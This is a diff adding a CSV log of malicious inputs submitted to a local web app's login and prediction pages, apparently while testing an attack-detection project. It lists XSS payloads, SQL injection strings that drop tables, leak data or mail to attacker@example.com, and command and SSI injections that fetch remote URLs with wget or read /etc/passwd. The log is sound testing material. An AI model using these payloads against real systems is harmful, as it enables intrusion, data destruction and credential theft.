@@ -1,0 +1,72 @@
+Malicious Payload,URL,Session Date,Session Time
+<script>alert(1)</script> dfd login ,http://localhost:5000/submit_login,2023-03-19,17:13:18
+<script>alert(1)</script> sdsd login ,http://localhost:5000/submit_login,2023-03-19,17:14:37
+exampleuser <script>alert(1)</script> ,http://localhost:5000/,2023-04-09,00:09:39
+exampleuser <script>alert(1)</script> ,http://localhost:5000/,2023-04-09,00:14:18
+exampleuser <svg contentScriptType=text/vbs><script>MsgBox+1 ,http://localhost:5000/,2023-04-09,00:17:32
+exampleuser <svg contentScriptType=text/vbs><script>MsgBox+1 ,http://localhost:5000/,2023-04-09,00:21:49
+exampleuser <script>alert(1)</script> ,http://localhost:5000/,2023-04-09,00:34:55
+<script>alert(1)</script> jjjj login ,http://localhost:5000/submit_login,2023-04-09,19:50:29
+<script>alert(1)</script> sss login ,http://localhost:5000/submit_login,2023-04-09,20:15:06
+<script>alert(1)</script> ss login ,http://localhost:5000/submit_login,2023-04-10,23:40:00
+<script>destroyWebsite();</script> aaa login ,http://localhost:5000/submit_login,2023-04-10,23:40:16
+<script>destroyWebsite();</script> mmmm login ,http://localhost:5000/submit_login,2023-04-12,08:10:39
+<script>destroyWebsite();</script> Gokul login ,http://localhost:5000/submit_login,2023-04-12,11:47:17
+"string (password(),1,2)='10' fuiffeuiu login ",http://localhost:5000/submit_login,2023-04-12,11:50:14
+<script>alert('XSS')</script> ,http://localhost:5000/predict,2023-04-24,21:36:30
+<script>alert('XSS')</script> ,http://localhost:5000/,2023-04-24,21:38:23
+exampleuser <script>alert(1)</script> ,http://localhost:5000/,2023-04-24,21:41:27
+<script>alert(1)</script> gokul login ,http://localhost:5000/submit_login,2023-04-24,22:36:52
+<script>alert(1)</script> jjj login ,http://localhost:5000/submit_login,2023-04-24,22:38:44
+<script>alert(1)</script> jjj login ,http://localhost:5000/submit_login,2023-04-24,22:41:00
+<script>destroyWebsite();</script> Gokul login ,http://localhost:5000/submit_login,2023-04-24,22:44:35
+<script>destroyWebsite();</script> gokul login ,http://localhost:5000/submit_login,2023-04-24,22:47:32
+<script>destroyWebsite();</script> gokul login ,http://localhost:5000/submit_login,2023-04-24,22:49:19
+<script>alert(1)</script> ggg login ,http://localhost:5000/submit_login,2023-04-24,22:55:04
+<script>destroyWebsite();</script> hhh login ,http://localhost:5000/submit_login,2023-04-24,22:56:16
+<script>destroyWebsite();</script> gokul login ,http://localhost:5000/submit_login,2023-04-24,23:04:55
+<script>destroyWebsite();</script> hhhh login ,http://localhost:5000/submit_login,2023-04-24,23:18:31
+<script>destroyWebsite();</script> gokul login ,http://localhost:5000/submit_login,2023-04-25,10:09:11
+<script>destroyWebsite();</script> Gokul login ,http://localhost:5000/submit_login,2023-04-25,10:25:53
+<script>destroyWebsite();</script> 11111 login ,http://localhost:5000/submit_login,2023-05-02,18:57:40
+<script>destroyWebsite();</script> kkkk login ,http://localhost:5000/submit_login,2023-05-02,19:23:39
+<script>destroyWebsite();</script> 1937 login ,http://localhost:5000/submit_login,2023-05-02,19:37:37
+<script>destroyWebsite();</script> gokul login ,http://localhost:5000/submit_login,2023-05-02,19:44:07
+SELECT * FROM users WHERE username='johndoe'; DROP TABLE users; --' gokul login ,http://localhost:5000/submit_login,2023-05-02,19:56:07
+<script>destroyWebsite();</script> Gaps login ,http://localhost:5000/submit_login,2023-05-03,10:26:19
+<script>destroyWebsite();</script> oliu login ,http://localhost:5000/submit_login,2023-05-03,10:30:47
+SELECT * FROM users WHERE username='johndoe'; DROP TABLE users; --' gokul@0000 login ,http://localhost:5000/submit_login,2023-05-06,21:56:06
+<script>   alert('Outer script');   <script>alert('Inner script');</script> </script> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:11:33
+<img src=javascript&#x3a;alert(1)> Gokul login ,http://localhost:5000/submit_login,2023-05-07,12:13:33
+"<img src=""javascript:alert('XSS');""> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:13:56
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:14:16
+"<a href=""javascript:void(0)"" onclick=""alert('XSS')"">Click me</a> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:14:34
+<script>   alert('Outer script');   <script>alert('Inner script');</script> </script> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:19:42
+<img src=javascript&#x3a;alert(1)> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:20:41
+"<img src=""javascript:alert('XSS');""> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:21:19
+<script>alert(document.cookie)</script> ,http://localhost:5000/,2023-05-07,12:23:46
+<img src=javascript&#x3a;alert(1)> gokul login ,http://localhost:5000/submit_login,2023-05-07,12:36:42
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,12:37:52
+SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM nonexistent_table; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:46:55
+SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM users WHERE username = 'hacker' AND LENGTH(password) = 8; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:47:46
+"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT IF(SLEEP(5), 1, 0) FROM users WHERE username = 'hacker'; gokul login ",http://localhost:5000/submit_login,2023-05-07,12:48:29
+"SELECT * FROM users WHERE username = 'admin'; EXEC master..xp_sendmail 'attacker@example.com', 'Test message', 'Test subject'; gokul login ",http://localhost:5000/submit_login,2023-05-07,12:49:07
+INSERT INTO comments (comment_text) VALUES ('This is a normal comment'); UPDATE users SET password = 'hacked' WHERE username = 'admin'; gokul login ,http://localhost:5000/submit_login,2023-05-07,12:51:38
+1' or '1' = '1 1' or '1' = '1 ,http://localhost:5000/,2023-05-07,12:52:13
+1' or '1' = '1'))/* foo ,http://localhost:5000/,2023-05-07,12:53:16
+10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-- ,http://localhost:5000/,2023-05-07,13:03:47
+"""&& perl -e 'print """"X""""x4096' gokul login ",http://localhost:5000/submit_login,2023-05-07,13:52:09
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`) gokul login ,http://localhost:5000/submit_login,2023-05-07,14:16:16
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:17:03
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:20:47
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:25:31
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:27:39
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> jjj login ",http://localhost:5000/submit_login,2023-05-07,14:30:37
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",http://localhost:5000/submit_login,2023-05-07,14:58:45
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> jjj login ",http://localhost:5000/submit_login,2023-05-07,15:02:12
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> cccc login ",http://localhost:5000/submit_login,2023-05-07,15:06:57
+<img src=javascript&#x3a;alert(1)> sugav login ,http://localhost:5000/submit_login,2023-05-07,18:07:24
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; gokul login ,http://localhost:5000/submit_login,2023-05-07,18:15:39
+1' or '1' = '1 1' or '1' = '1 ,http://localhost:5000/,2023-05-07,18:19:07
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX iiii login ,http://localhost:5000/submit_login,2023-05-07,18:21:58
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; iiii login ,http://localhost:5000/submit_login,2023-05-07,18:23:23
